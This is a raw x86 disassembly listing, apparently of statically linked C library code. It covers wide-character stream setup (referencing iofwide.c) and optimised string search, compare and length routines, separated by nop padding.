test ebx, ebx
jne 0x8076299
mov eax, dword [edx + 0x20]
mov ecx, dword [var_14h]
mov ebx, dword [var_10h]
sub ebx, dword [edx + 8]
lea eax, [eax + ecx*4]
mov dword [edx + 0x24], eax
mov eax, dword [edi + 0x30]
mov edx, ebx
sar edx, 2
test eax, eax
je 0x807628f
sub dword [eax + 8], edx
mov eax, dword [eax]
test eax, eax
jne 0x8076286
xor eax, eax
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], ebx
mov eax, dword [edx + 8]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [edx + 0x20]
mov edx, dword [var_14h]
lea eax, [eax + edx*4]
mov dword [esp], eax
call fcn.080776d0
mov edx, dword [edi + 0x58]
jmp 0x8076268
mov eax, esi
mov ebx, dword [var_14h]
shl esi, 2
neg eax
mov dword [var_8h], eax
mov eax, dword [edx + 0x28]
shl ebx, 2
add eax, esi
mov dword [var_4h], eax
mov eax, dword [edx + 0x20]
add eax, ebx
mov dword [esp], eax
call fcn.08077700
mov eax, dword [var_10h]
mov edx, dword [edi + 0x58]
sub eax, dword [edx + 8]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 8]
mov dword [var_4h], eax
add ebx, dword [edx + 0x20]
sub ebx, esi
mov dword [esp], ebx
jmp 0x80762b3
lea eax, [ebx + 0x64]
mov dword [var_14h], 0x64
mov dword [var_1ch], eax
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_18h], eax
mov edx, dword [var_18h]
mov eax, 0xffffffff
test edx, edx
je 0x8076291
test esi, esi
js 0x8076380
mov eax, dword [edi + 0x58]
mov dword [var_8h], ebx
mov eax, dword [eax + 8]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, 0x190
mov dword [esp], eax
call fcn.080776d0
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x20]
test eax, eax
jne 0x8076373
mov ecx, dword [var_18h]
mov ebx, dword [var_1ch]
lea eax, [ecx + ebx*4]
mov dword [edx + 0x20], ecx
mov dword [edx + 0x28], eax
jmp 0x8076268
mov dword [esp], eax
call fcn.08051180
mov edx, dword [edi + 0x58]
jmp 0x807635f
mov eax, esi
neg eax
mov dword [var_8h], eax
mov eax, dword [edi + 0x58]
mov eax, dword [eax + 0x28]
lea eax, [eax + esi*4]
mov dword [var_4h], eax
mov eax, dword [var_18h]
add eax, 0x190
mov dword [esp], eax
call fcn.080539d0
mov edx, dword [var_10h]
mov ecx, dword [edi + 0x58]
sub edx, dword [ecx + 8]
sar edx, 2
mov dword [var_8h], edx
mov edx, dword [ecx + 8]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080539d0
jmp 0x8076355
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
cmp eax, dword [edx + 8]
jbe 0x80763ee
cmp dword [eax - 4], ecx
je 0x807640b
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], ecx
call dword [eax + 0x18]
cmp eax, 0xffffffff
je 0x8076406
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
sub eax, 4
mov dword [edx], eax
mov eax, ecx
jmp 0x80763fe
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x58]
mov ecx, dword [edx]
cmp ecx, dword [edx + 8]
jbe 0x807644b
lea eax, [ecx - 4]
mov dword [edx], eax
mov eax, dword [ecx - 4]
cmp eax, 0xffffffff
je 0x8076446
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0x18]
jmp 0x807643e
jmp fcn.08076470
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ecx, dword [arg_ch]
mov ebx, dword [arg_10h]
lea edx, [ecx + ebx*4]
cmp edx, ecx
jbe 0x807648f
mov eax, edx
sub edx, 4
cmp dword [edx], 0xa
je 0x8076499
cmp edx, ecx
ja 0x8076483
mov eax, dword [arg_8h]
add eax, ebx
mov ebx, dword [esp]
leave
ret
sub eax, edx
sar eax, 2
dec eax
jmp 0x8076494
jmp fcn.080764b0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [ebx]
mov dword [esi + 4], ebx
test ah, 8
jne 0x8076500
test ah, 1
je 0x80764ef
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
sub eax, dword [edx + 4]
sar eax, 2
mov dword [esi + 8], eax
mov eax, dword [ebx + 0x30]
mov dword [esi], eax
mov dword [ebx + 0x30], esi
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
mov edx, dword [ebx + 0x58]
mov eax, dword [edx]
sub eax, dword [edx + 8]
jmp 0x80764d9
lea esi, [esi]
mov dword [esp], ebx
call fcn.08076150
mov eax, dword [ebx]
jmp 0x80764cc
lea esi, [esi]
push ebp
mov eax, 0xffffffff
mov ebp, esp
mov ecx, dword [ebp + 8]
mov edx, dword [ecx + 4]
test edx, edx
je 0x8076538
test byte [edx + 1], 1
je 0x8076540
mov eax, dword [edx + 0x58]
mov edx, dword [eax]
sub edx, dword [eax + 4]
mov eax, dword [ecx + 8]
sar edx, 2
sub eax, edx
leave
ret
lea esi, [esi]
mov eax, dword [edx + 0x58]
mov edx, dword [eax]
sub edx, dword [eax + 8]
jmp 0x8076530
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_ch]
mov ebx, dword [esi + 4]
cmp ebx, dword [arg_8h]
jne 0x80765b1
mov ecx, dword [esi + 8]
test ecx, ecx
js 0x8076596
test byte [ebx + 1], 1
jne 0x8076589
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 8]
lea edx, [edx + ecx*4]
mov dword [eax], edx
xor eax, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08075a00
mov ecx, dword [esi + 8]
jmp 0x8076574
test byte [ebx + 1], 1
je 0x80765a4
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 4]
jmp 0x807657a
mov dword [esp], ebx
call fcn.08075a30
mov ecx, dword [esi + 8]
jmp 0x807659c
mov eax, 0xffffffff
jmp 0x8076581
nop
lea esi, [esi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x30]
test edx, edx
je 0x80765d4
mov dword [eax + 0x30], 0
mov ecx, dword [eax + 0x24]
test ecx, ecx
jne 0x80765dd
leave
ret
mov dword [arg_8h], eax
leave
jmp fcn.080761d0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x30
cmp dword [arg_ch], 0
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
jl 0x8076797
setne al
movzx eax, al
mov dword [var_20h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x5c]
test eax, eax
jne 0x8076747
cmp dword [var_20h], 0
je 0x8076747
jle 0x807673c
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x58]
mov edx, dword [eax + 4]
lea ebx, [eax + 0x3c]
mov dword [ecx + 0x54], ebx
mov dword [eax + 0x30], 0
mov dword [eax + 0x2c], 0
mov dword [eax], edx
mov edx, dword [eax + 0xc]
mov dword [eax + 0x10], edx
mov eax, dword [ecx + 0x58]
mov dword [eax + 0x34], 0
mov dword [eax + 0x38], 0
lea eax, [var_1ch]
call fcn.08053c20
cmp dword [var_18h], 1
jne 0x8076776
cmp dword [var_10h], 1
jne 0x8076752
cld
mov esi, 0x80a9b40
mov ecx, 0x1e
mov edi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_18h]
mov edx, dword [arg_8h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x30], 1
mov dword [ebx + 0x34], 0
mov dword [ebx + 0x38], 1
mov dword [ebx + 0x24], eax
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x48], 0
add eax, 0x2c
mov dword [ebx + 0x3c], eax
mov eax, dword [var_10h]
mov dword [ebx + 0x4c], eax
mov eax, dword [var_14h]
mov dword [ebx + 0x5c], 1
mov dword [ebx + 0x60], 0
mov dword [ebx + 0x64], 1
mov dword [ebx + 0x50], eax
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x74], 0x80a9bb8
add eax, 0x2c
mov dword [ebx + 0x68], eax
mov eax, dword [edx + 0x58]
mov eax, dword [eax + 0xb8]
mov dword [edx + 0x94], eax
mov dword [esp], edx
mov dword [var_sp_8h], 0
mov dword [var_sp_ch], 1
mov dword [var_sp_4h], 0
call dword [eax + 0x40]
mov ecx, dword [arg_8h]
mov dword [ecx + 0x4c], eax
mov dword [ecx + 0x50], edx
mov edx, dword [var_20h]
mov eax, dword [arg_8h]
mov dword [eax + 0x5c], edx
mov eax, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [var_sp_ch], 0x80a2be0
mov dword [var_sp_8h], 0x89
mov dword [var_sp_4h], str.iofwide.c
mov dword [esp], str.fcts.tomb_nsteps__1
call fcn.0805efc0
mov dword [var_sp_ch], 0x80a2be0
mov dword [var_sp_8h], 0x88
mov dword [var_sp_4h], str.iofwide.c
mov dword [esp], str.fcts.towc_nsteps__1
jmp 0x8076771
mov dword [var_20h], 0xffffffff
jmp 0x8076622
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov esi, dword [ebx + 0x50]
mov dword [var_10h], eax
mov eax, dword [arg_1ch]
mov dword [ebx + 0x54], eax
mov eax, dword [arg_20h]
mov dword [ebx + 0x58], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x68], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_14h], eax
mov dword [var_sp_10h], 0
mov dword [esp], esi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
lea eax, [var_10h]
mov dword [var_8h], eax
lea eax, [ebx + 0x54]
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [var_10h]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
mov eax, dword [arg_24h]
mov edx, dword [ebx + 0x54]
mov dword [eax], edx
je 0x8076844
jg 0x8076848
test ecx, ecx
je 0x8076844
mov eax, 2
add esp, 0x28
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x807683d
cmp ecx, 5
je 0x8076852
cmp ecx, 7
jne 0x8076838
mov eax, 1
jmp 0x807683d
lea esi, [esi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x24
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov dword [ebx + 0x54], eax
mov esi, dword [ebx + 0x50]
mov eax, dword [arg_14h]
mov dword [ebx + 0x58], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x68], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 1
mov dword [var_14h], eax
mov dword [var_10h], 0
mov dword [var_sp_ch], 0
lea eax, [ebx + 0x54]
mov dword [var_8h], 0
mov dword [esp], esi
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [ebx + 0x54]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
je 0x80768e8
jg 0x80768ec
test ecx, ecx
je 0x80768e8
mov eax, 2
add esp, 0x24
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x80768e1
cmp ecx, 5
je 0x80768f6
cmp ecx, 7
jne 0x80768dc
mov eax, 1
jmp 0x80768e1
lea esi, [esi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov ebx, dword [arg_8h]
mov esi, dword [ebx + 0x24]
mov dword [var_10h], eax
mov eax, dword [arg_1ch]
mov dword [ebx + 0x28], eax
mov eax, dword [arg_20h]
mov dword [ebx + 0x2c], eax
mov eax, dword [arg_ch]
mov dword [ebx + 0x3c], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_ch]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_14h], eax
mov dword [var_sp_10h], 0
mov dword [esp], esi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
lea eax, [var_10h]
mov dword [var_8h], eax
lea eax, [ebx + 0x28]
mov dword [var_4h], eax
call dword [esi + 0x14]
mov edx, dword [var_10h]
mov ecx, eax
mov eax, dword [arg_18h]
cmp ecx, 4
mov dword [eax], edx
mov eax, dword [arg_24h]
mov edx, dword [ebx + 0x28]
mov dword [eax], edx
je 0x8076994
jg 0x8076998
test ecx, ecx
je 0x8076994
mov eax, 2
add esp, 0x28
pop ebx
pop esi
leave
ret
xor eax, eax
jmp 0x807698d
cmp ecx, 5
je 0x80769a2
cmp ecx, 7
jne 0x8076988
mov eax, 1
jmp 0x807698d
lea esi, [esi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x24]
mov eax, 0xffffffff
mov ecx, dword [edx + 0x34]
test ecx, ecx
jne 0x80769ce
mov eax, dword [edx + 0x24]
cmp eax, dword [edx + 0x28]
cmovne eax, ecx
leave
ret
push ebp
xor eax, eax
mov ebp, esp
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edx, dword [arg_18h]
mov ebx, dword [arg_8h]
mov edi, esp
mov dword [var_14h], eax
lea eax, [edx*4 + 0x10]
sub esp, eax
mov esi, dword [ebx + 0x24]
lea eax, [var_2fh]
and eax, 0xfffffff0
mov dword [ebx + 0x28], eax
lea edx, [eax + edx*4]
mov eax, dword [arg_ch]
mov dword [ebx + 0x2c], edx
mov dword [ebx + 0x3c], eax
add ebx, 0x28
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_10h]
mov dword [var_1ch], 0
mov dword [var_18h], 0
mov dword [var_sp_14h], eax
mov dword [var_sp_10h], 0
mov eax, dword [arg_14h]
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
lea eax, [var_14h]
mov dword [var_8h], eax
call dword [esi + 0x14]
mov eax, dword [var_14h]
sub eax, dword [arg_10h]
mov esp, edi
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x24]
mov eax, dword [eax + 0x28]
leave
ret
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xb4
mov dword [esp], 0x64
call fcn.08050fe0
mov esi, eax
mov eax, 0xffffffff
test esi, esi
je 0x8076b9e
lea ebx, [var_ach]
mov dword [var_64h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0xffffffff
mov dword [var_4h], 0x8000
mov dword [esp], ebx
call fcn.0804e030
mov dword [var_18h], 0x8092c20
mov dword [var_ch], esi
mov dword [var_8h], 0x64
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0804e940
mov eax, dword [arg_10h]
and dword [var_ach], 0xfffffffe
mov dword [var_14h], fcn.08050fe0
mov dword [var_bp_10h], fcn.08051180
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08064160
test eax, eax
mov edi, eax
js 0x8076bc2
mov edx, dword [var_9ch]
mov ebx, dword [var_98h]
mov eax, dword [var_94h]
sub ebx, edx
sub eax, edx
lea esi, [ebx + 1]
add eax, eax
cmp eax, esi
jbe 0x8076ba9
mov dword [esp], esi
call fcn.08050fe0
mov edx, eax
mov eax, dword [arg_8h]
test edx, edx
mov dword [eax], edx
je 0x8076ba9
mov eax, dword [var_90h]
mov dword [var_8h], ebx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053770
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [arg_8h]
mov eax, dword [edx]
test eax, eax
jne 0x8076b97
mov eax, dword [var_90h]
mov dword [edx], eax
mov byte [esi + eax - 1], 0
mov eax, edi
add esp, 0xb4
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_90h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08051220
mov edx, dword [arg_8h]
mov dword [edx], eax
jmp 0x8076b86
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.08051180
jmp 0x8076b9c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
leave
jmp 0x804e540
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
cmp word [ecx], 0
sets al
inc eax
test ebx, ebx
je 0x8076c24
mov edx, dword [ecx]
and dh, 0x7f
cmp ebx, 2
mov dword [ecx], edx
je 0x8076c29
mov ebx, dword [esp]
leave
ret
or dh, 0x80
mov dword [ecx], edx
jmp 0x8076c24
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x24
mov edx, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_10h]
test edx, edx
jle 0x8076cae
mov eax, dword [esi]
mov ecx, eax
and eax, 0xffffffdf
mov dword [esi], eax
and ecx, 0x20
mov dword [esp], esi
lea eax, [edx - 1]
mov dword [var_10h], ecx
mov dword [var_sp_10h], 1
mov dword [var_sp_8h], eax
mov dword [var_sp_ch], 0xa
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
call fcn.0808db00
test eax, eax
mov edi, eax
je 0x8076ccd
mov ebx, dword [esi]
test bl, 0x20
je 0x8076cc0
call fcn.08048b20
cmp dword [eax], 0xb
je 0x8076cc0
xor eax, eax
or ebx, dword [var_10h]
mov dword [esi], ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
mov ecx, dword [arg_8h]
mov byte [edi + ecx], 0
mov eax, ecx
mov ebx, dword [esi]
jmp 0x8076ca9
mov ebx, dword [esi]
jmp 0x8076ca7
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
jmp 0x8076d43
lea esi, [esi]
add eax, 0x10
mov ecx, dword [eax]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e27
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e27
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 4]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e24
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e24
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 8]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e21
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e21
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 0xc]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1e
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1e
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
je 0x8076d40
xor eax, eax
pop edi
ret
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
test ch, ch
je 0x8076e45
cmp ch, dl
je 0x8076e1a
inc eax
shr ecx, 0x10
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_4h]
mov edx, dword [arg_8h]
mov al, byte [ecx]
cmp al, byte [edx]
jne 0x8076e67
inc ecx
inc edx
test al, al
jne 0x8076e58
xor eax, eax
ret
mov eax, 1
mov ecx, 0xffffffff
cmovb eax, ecx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076eba
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov eax, dword [arg_ch]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_sp_4h], eax
mov dword [esp], esi
call fcn.08076f30
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076f17
mov byte [ebx + eax], 0
mov dword [esp], eax
mov dword [var_sp_4h], esi
mov dword [var_sp_8h], ebx
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor edx, edx
mov ebp, esp
push esi
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
push ebx
test eax, eax
lea ebx, [eax + esi]
je 0x8076fae
cmp ebx, esi
mov eax, 0xffffffff
cmovb ebx, eax
test esi, 3
mov eax, esi
je 0x8076f62
cmp byte [eax], 0
je 0x8076fa5
inc eax
test al, 3
jne 0x8076f58
cmp eax, ebx
mov edx, eax
jae 0x8076fa5
mov eax, dword [edx]
add edx, 4
sub eax, 0x1010101
test eax, 0x80808080
je 0x8076f9f
cmp byte [edx - 4], 0
lea ecx, [edx - 4]
mov eax, ecx
je 0x8076fa5
cmp byte [ecx + 1], 0
lea eax, [edx - 3]
je 0x8076fa5
cmp byte [ecx + 2], 0
lea eax, [edx - 2]
je 0x8076fa5
cmp byte [ecx + 3], 0
lea eax, [edx - 1]
je 0x8076fa5
cmp edx, ebx
mov eax, ebx
jb 0x8076f68
cmp eax, ebx
mov edx, ebx
cmovbe edx, eax
sub edx, esi
pop ebx
pop esi
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
push ebx
xor ebx, ebx
cmp esi, 3
jbe 0x807702e
mov edi, esi
shr edi, 2
lea esi, [esi]
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec edi
jne 0x8076fe0
and esi, 3
test esi, esi
je 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec esi
jne 0x8077032
movzx edx, bl
movzx eax, al
pop ebx
pop esi
pop edi
sub edx, eax
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
xor eax, eax
mov esi, dword [arg_ch]
mov ecx, dword [arg_10h]
mov ch, cl
mov edx, ecx
shl ecx, 0x10
mov cx, dx
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x807708a
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770a3
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770bc
mov eax, esi
or dl, dl
je 0x8077216
inc esi
jmp 0x8077103
add byte [eax], al
add byte [ebx - 0x117cfb12], al
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff000000
jne 0x80770e9
lea eax, [esi + 0xf]
jmp 0x8077100
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff0000
jne 0x80770f6
lea eax, [esi + 0xe]
jmp 0x8077100
lea eax, [esi + 0xc]
test dh, dh
jne 0x8077100
lea eax, [esi + 0xd]
add esi, 0x10
mov edx, dword [esi]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771ec
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771ec
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770ca
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e0
mov edx, dword [esi + 4]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e9
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e9
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770cd
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e3
mov edx, dword [esi + 8]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e6
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e6
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d0
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e6
mov edx, dword [esi + 0xc]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e3
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e3
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d3
xor edi, edx
or edi, 0xfefefeff
inc edi
je 0x8077100
jmp 0x80770e9
add esi, 4
add esi, 4
add esi, 4
cmp dl, cl
jne 0x80771f2
mov eax, esi
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x80771fd
lea eax, [esi + 1]
test dh, dh
je 0x8077216
shr edx, 0x10
cmp dl, cl
jne 0x807720b
lea eax, [esi + 2]
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x8077216
lea eax, [esi + 3]
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
push esi
push edi
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
cmp esi, 4
jb 0x807737f
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
jmp 0x8077316
nop
lea esi, [esi]
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
mov ecx, dword [eax + 4]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a2
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a2
mov ecx, dword [eax + 8]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739f
